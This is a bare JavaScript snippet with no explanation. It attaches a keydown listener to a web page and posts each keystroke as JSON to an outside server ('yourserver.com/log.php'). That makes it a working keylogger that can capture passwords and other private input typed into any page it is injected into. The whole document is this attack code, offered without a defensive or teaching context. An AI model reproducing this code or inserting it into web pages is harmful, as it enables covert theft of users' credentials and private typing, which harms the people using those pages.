document.addEventListener('keydown', function(event) {
    fetch("https://yourserver.com/log.php", {
        method: "POST",
        body: JSON.stringify({ key: event.key }),
        headers: { "Content-Type": "application/json" }
    });
});
